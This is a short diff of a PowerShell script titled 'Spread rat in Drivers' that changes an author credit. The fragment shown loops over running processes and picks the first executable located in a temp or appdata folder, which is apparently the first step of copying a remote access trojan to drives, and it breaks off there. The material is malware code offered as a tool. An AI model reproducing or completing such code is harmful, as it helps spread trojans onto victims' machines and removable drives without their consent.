@@ -1,5 +1,5 @@
 ﻿#Spread rat in Drivers
-#Owned by Karem Ali , IHACk
+#Owned by Karem Ali 
 while(1){
 $P = get-process  | Get-ChildItem | select @{n='name'; e={$_.basename}} , directory | where{$_.directory  -like "*temp*" –or $_.directory -like "*appdata*"} | Select -ExpandProperty name -First 1
 $h= ":"
